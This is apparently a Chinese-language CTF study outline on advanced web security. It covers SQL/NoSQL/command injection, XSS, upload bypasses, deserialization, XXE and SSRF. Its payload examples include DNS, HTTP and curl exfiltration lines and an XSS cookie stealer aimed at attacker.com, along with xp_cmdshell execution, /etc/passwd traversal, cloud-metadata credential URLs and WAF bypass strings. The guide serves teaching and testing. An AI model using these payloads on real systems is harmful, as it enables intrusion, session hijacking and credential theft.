# 🌐 Web安全进阶知识体系

## 🎯 学习目标
- 深入理解Web应用安全机制
- 掌握高级Web漏洞挖掘技术
- 熟练使用Web安全测试工具
- 具备独立进行Web渗透测试的能力

## 📚 核心知识体系

### 1. 注入攻击深度解析

#### SQL注入进阶技术
```
1. 盲注技术:
   布尔盲注:
   - 构造真假条件判断
   - 二分法猜解数据
   - 示例: and ascii(substr(database(),1,1))>97

   时间盲注:
   - 利用延时函数
   - 通过响应时间判断
   - 示例: and if(ascii(substr(database(),1,1))>97,sleep(5),0)

   报错注入:
   - 利用数据库报错信息
   - 常用函数: extractvalue(), updatexml()
   - 示例: and extractvalue(1,concat(0x7e,database(),0x7e))

2. 联合注入技巧:
   字段数判断:
   - order by 方法
   - union select null 方法
   - 示例: union select 1,2,3,4

   数据库指纹识别:
   - 版本信息获取
   - 特有函数测试
   - 示例: union select version(),user(),database()

   数据提取:
   - 系统表查询
   - 敏感信息获取
   - 示例: union select table_name from information_schema.tables

3. 高级绕过技术:
   WAF绕过:
   - 大小写变换: SeLeCt
   - 注释绕过: /**/
   - 编码绕过: %20, %0a, %0d
   - 双重编码: %2520
   - 内联注释: /*!50000select*/

   过滤绕过:
   - 关键字替换: union -> ununionion
   - 等价函数: substring() -> mid()
   - 特殊字符: 空格 -> /**/, +, %20, %0a
   - 引号绕过: 十六进制编码, char()函数

4. 不同数据库特性:
   MySQL:
   - 无列名注入: union select 1,2,3 from (select * from users)a
   - 文件读写: load_file(), into outfile
   - 信息收集: information_schema

   PostgreSQL:
   - 命令执行: copy to/from program
   - 大对象操作: lo_import(), lo_export()
   - 系统表: pg_tables, pg_user

   Oracle:
   - 双重查询: select * from (select rownum r,* from users) where r=1
   - XML注入: extractvalue(), xmltype()
   - 系统表: all_tables, user_tables

   SQL Server:
   - 堆叠查询: ; exec xp_cmdshell 'whoami'
   - 系统函数: @@version, db_name()
   - 系统表: sysobjects, syscolumns
```

#### NoSQL注入
```
MongoDB注入:
1. 认证绕过:
   - 操作符注入: {"$ne": null}
   - 正则表达式: {"$regex": ".*"}
   - JavaScript注入: {"$where": "this.username == this.password"}

2. 数据提取:
   - 盲注技术: {"$regex": "^a"}
   - 长度判断: {"$where": "this.password.length == 5"}
   - 字符猜解: {"$where": "this.password[0] == 'a'"}

3. 防护绕过:
   - 类型混淆: 数组vs字符串
   - 编码绕过: URL编码, Unicode编码
   - 逻辑绕过: 多条件组合

Redis注入:
1. 命令注入:
   - 协议特性利用
   - 管道命令执行
   - 数据库操作

2. 文件写入:
   - config set dir
   - config set dbfilename
   - save命令利用

3. 主从复制:
   - 恶意从服务器
   - 模块加载
   - 代码执行
```

#### 命令注入
```
1. 基础命令注入:
   分隔符:
   - ; && || | ` $() ${} 
   - 换行符: %0a %0d
   - 空字符: %00

   常用命令:
   - Linux: ls, cat, whoami, id, ps
   - Windows: dir, type, whoami, tasklist

2. 盲命令注入:
   时间延迟:
   - Linux: sleep 5, ping -c 5 127.0.0.1
   - Windows: timeout 5, ping -n 5 127.0.0.1

   DNS外带:
   - nslookup `whoami`.attacker.com
   - dig `id`.attacker.com

   HTTP外带:
   - curl http://attacker.com/`whoami`
   - wget http://attacker.com/?data=`id`

3. 绕过技术:
   过滤绕过:
   - 变量替换: $IFS, ${IFS}
   - 编码绕过: base64, hex
   - 拼接绕过: ca''t, c\at

   长度限制:
   - 短命令: ls, id, ps
   - 环境变量: $0, $9
   - 文件写入: echo>a, cat a

   字符限制:
   - 无字母: ${#} 获取长度
   - 无数字: $? 获取状态码
   - 无空格: ${IFS} 替换
```

### 2. 跨站脚本攻击(XSS)深度分析

#### XSS类型详解
```
1. 反射型XSS:
   特点:
   - 非持久化存储
   - 需要用户点击恶意链接
   - 参数直接回显到页面

   利用场景:
   - URL参数注入
   - HTTP头部注入
   - POST数据注入

   Payload示例:
   - <script>alert('XSS')</script>
   - <img src=x onerror=alert('XSS')>
   - javascript:alert('XSS')

2. 存储型XSS:
   特点:
   - 持久化存储在服务器
   - 影响所有访问用户
   - 危害最大

   常见位置:
   - 用户评论
   - 个人资料
   - 留言板
   - 文件上传

3. DOM型XSS:
   特点:
   - 客户端代码缺陷
   - 不经过服务器
   - 难以检测

   危险函数:
   - document.write()
   - innerHTML
   - eval()
   - setTimeout()

   触发点:
   - location.hash
   - location.search
   - document.referrer
   - postMessage
```

#### XSS绕过技术
```
1. 过滤器绕过:
   大小写混淆:
   - <ScRiPt>alert(1)</ScRiPt>
   - <IMG SRC=x OnErRoR=alert(1)>

   编码绕过:
   - HTML实体: &lt;script&gt;
   - URL编码: %3Cscript%3E
   - Unicode编码: \u003cscript\u003e
   - 十六进制: &#x3C;script&#x3E;

   标签变形:
   - <script/src=//attacker.com/evil.js>
   - <script>/**/alert(1)/**/</script>
   - <script
   >alert(1)</script>

2. 事件处理器:
   鼠标事件:
   - onmouseover, onmouseout
   - onclick, ondblclick
   - onmousedown, onmouseup

   键盘事件:
   - onkeydown, onkeyup, onkeypress

   表单事件:
   - onfocus, onblur, onchange
   - onsubmit, onreset

   其他事件:
   - onload, onerror, onresize
   - onscroll, ontimeout

3. 无脚本标签XSS:
   CSS注入:
   - <style>body{background:url('javascript:alert(1)')}</style>
   - <link rel=stylesheet href='javascript:alert(1)'>

   SVG注入:
   - <svg onload=alert(1)>
   - <svg><script>alert(1)</script></svg>

   表单注入:
   - <form><button formaction=javascript:alert(1)>Click
   - <input onfocus=alert(1) autofocus>
```

#### XSS利用技术
```
1. Cookie窃取:
   - document.cookie获取
   - 发送到攻击者服务器
   - 会话劫持攻击

   示例:
   <script>
   new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
   </script>

2. 键盘记录:
   - 监听keydown事件
   - 记录用户输入
   - 窃取敏感信息

3. 页面劫持:
   - 修改页面内容
   - 伪造登录表单
   - 钓鱼攻击

4. CSRF攻击:
   - 利用用户权限
   - 执行敏感操作
   - 状态改变攻击

5. 内网扫描:
   - JavaScript端口扫描
   - 内网服务发现
   - 跨域信息收集
```

### 3. 文件上传漏洞

#### 上传绕过技术
```
1. 文件类型检测绕过:
   前端检测:
   - 修改JavaScript代码
   - 禁用JavaScript
   - 抓包修改请求

   MIME类型检测:
   - 修改Content-Type头
   - 伪造MIME类型
   - 示例: image/jpeg

   文件扩展名检测:
   - 大小写绕过: .PHP, .Php
   - 双重扩展名: .php.jpg
   - 特殊扩展名: .php3, .php5, .phtml
   - 空字节绕过: .php%00.jpg
   - 点号绕过: .php.

2. 文件内容检测绕过:
   文件头检测:
   - 添加合法文件头
   - GIF89a + PHP代码
   - JPEG文件头 + PHP代码

   文件结构检测:
   - 构造合法文件结构
   - 在注释中插入代码
   - 利用文件格式特性

3. WAF绕过:
   文件名绕过:
   - 中文文件名
   - 特殊字符: ., -, _
   - 长文件名

   内容绕过:
   - 编码混淆
   - 变量函数
   - 回调函数
   - 反序列化
```

#### 上传后利用
```
1. 路径遍历:
   - ../../../etc/passwd
   - ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
   - 编码绕过: %2e%2e%2f

2. 文件包含:
   - 本地文件包含(LFI)
   - 远程文件包含(RFI)
   - 日志文件包含
   - 临时文件包含

3. 条件竞争:
   - 上传后快速访问
   - 利用处理延迟
   - 批量上传攻击

4. 二次渲染绕过:
   - 图片处理后仍保留代码
   - GIF动画帧利用
   - PNG/JPEG元数据利用
```

### 4. 反序列化漏洞

#### PHP反序列化
```
1. 基础概念:
   序列化格式:
   - s:字符串 i:整数 b:布尔 a:数组 O:对象
   - 示例: O:4:"User":1:{s:4:"name";s:5:"admin";}

   魔术方法:
   - __construct(): 构造函数
   - __destruct(): 析构函数
   - __wakeup(): 反序列化时调用
   - __toString(): 对象转字符串
   - __call(): 调用不存在的方法

2. 利用技术:
   POP链构造:
   - 寻找可控制的魔术方法
   - 构造调用链
   - 实现任意代码执行

   绕过技术:
   - __wakeup绕过: 属性数量不匹配
   - 访问控制绕过: protected/private属性
   - 引用绕过: &符号利用

3. 常见利用点:
   - 文件操作类
   - 数据库操作类
   - 模板引擎类
   - 缓存操作类
```

#### Java反序列化
```
1. 基础知识:
   序列化机制:
   - Serializable接口
   - ObjectInputStream/ObjectOutputStream
   - serialVersionUID

   危险方法:
   - readObject()
   - readResolve()
   - readObjectNoData()

2. 利用链:
   Commons Collections:
   - CC1-CC7链
   - Transformer接口利用
   - InvokerTransformer执行

   Spring框架:
   - JdbcRowSetImpl
   - DefaultListableBeanFactory
   - MethodInvokeTypeProvider

3. 检测工具:
   - ysoserial: 生成利用载荷
   - SerializationDumper: 分析序列化数据
   - Java Deserialization Scanner: Burp插件
```

### 5. XXE (XML外部实体注入)

#### XXE基础
```
1. XML基础:
   实体类型:
   - 内部实体: <!ENTITY name "value">
   - 外部实体: <!ENTITY name SYSTEM "file:///etc/passwd">
   - 参数实体: <!ENTITY % name "value">

   DTD声明:
   - 内部DTD: <!DOCTYPE root [...]>
   - 外部DTD: <!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">

2. XXE类型:
   有回显XXE:
   - 直接读取文件内容
   - 错误信息泄露
   - 正常响应包含

   盲XXE:
   - 无直接回显
   - 需要外带数据
   - DNS/HTTP外带
```

#### XXE利用技术
```
1. 文件读取:
   Linux:
   - /etc/passwd
   - /etc/shadow
   - /proc/self/environ
   - /var/log/apache2/access.log

   Windows:
   - C:\Windows\System32\drivers\etc\hosts
   - C:\Windows\win.ini
   - C:\Windows\System32\inetsrv\MetaBase.xml

2. 内网探测:
   - 端口扫描: http://192.168.1.1:80
   - 服务识别: http://192.168.1.1:22
   - 协议探测: ftp://192.168.1.1

3. SSRF攻击:
   - 内网服务访问
   - 云元数据获取
   - 本地服务利用

4. 拒绝服务:
   - 十亿笑声攻击
   - 递归实体定义
   - 大文件读取
```

### 6. SSRF (服务端请求伪造)

#### SSRF基础
```
1. 攻击原理:
   - 服务器发起请求
   - 攻击者控制目标
   - 绕过网络限制
   - 访问内网资源

2. 常见触发点:
   - 图片加载/处理
   - 文件下载/上传
   - 网页截图
   - 邮件发送
   - RSS订阅
   - API调用
```

#### SSRF利用技术
```
1. 协议利用:
   HTTP/HTTPS:
   - 内网Web服务
   - API接口调用
   - 管理后台访问

   File协议:
   - file:///etc/passwd
   - file:///C:/Windows/win.ini
   - 本地文件读取

   Gopher协议:
   - TCP数据发送
   - Redis/MySQL攻击
   - 内网服务利用

   Dict协议:
   - 端口扫描
   - 服务识别
   - 信息收集

2. 绕过技术:
   IP地址绕过:
   - 十进制: 2130706433 (127.0.0.1)
   - 八进制: 0177.0.0.1
   - 十六进制: 0x7f.0.0.1
   - 混合进制: 0177.0x0.0.1

   域名绕过:
   - 短域名: http://t.cn/redirect
   - 子域名: http://127.0.0.1.attacker.com
   - DNS重绑定: 动态解析

   URL绕过:
   - URL编码: %31%32%37%2e%30%2e%30%2e%31
   - 双重编码: %2531%2532%2537
   - Unicode编码: ①②⑦.⓪.⓪.①

3. 云环境利用:
   AWS:
   - http://169.254.169.254/latest/meta-data/
   - IAM凭证获取
   - 实例信息收集

   阿里云:
   - http://100.100.100.200/latest/meta-data/
   - ECS元数据获取
   - 安全凭证泄露

   Azure:
   - http://169.254.169.254/metadata/instance
   - 访问令牌获取
   - 订阅信息泄露
```

## 🛠️ 高级工具与技术

### 1. 自动化扫描工具
```
Web漏洞扫描器:
- AWVS (Acunetix): 商业扫描器
- Nessus: 综合漏洞扫描
- OpenVAS: 开源扫描器
- Nikto: Web服务器扫描
- w3af: Web应用攻击框架

SQL注入工具:
- SQLMap: 自动化SQL注入
- jSQL Injection: 图形化工具
- NoSQLMap: NoSQL注入工具

XSS检测工具:
- XSSer: 自动化XSS检测
- BeEF: 浏览器利用框架
- XSStrike: 高级XSS检测

目录扫描工具:
- Dirbuster: 目录暴力破解
- Gobuster: 快速目录扫描
- ffuf: 模糊测试工具
```

### 2. 代理抓包工具
```
Burp Suite:
- Proxy: 代理抓包
- Repeater: 请求重放
- Intruder: 暴力破解
- Scanner: 漏洞扫描
- Extender: 插件扩展

OWASP ZAP:
- 开源代理工具
- 自动化扫描
- 模糊测试
- API测试

Fiddler:
- HTTP调试代理
- 请求修改
- 响应分析
- 性能测试
```

### 3. 编程语言安全
```
PHP安全:
- 代码审计技巧
- 常见漏洞模式
- 框架安全特性
- 安全编码规范

Java安全:
- Spring框架漏洞
- Struts2漏洞
- 反序列化漏洞
- 表达式注入

Python安全:
- Django框架安全
- Flask安全特性
- 模板注入漏洞
- Pickle反序列化

Node.js安全:
- 原型链污染
- 命令注入
- 路径遍历
- 依赖漏洞
```

这份Web安全进阶知识体系涵盖了CTF Web方向的核心技术，从基础漏洞到高级利用技术，为深入学习Web安全提供了全面的指导。
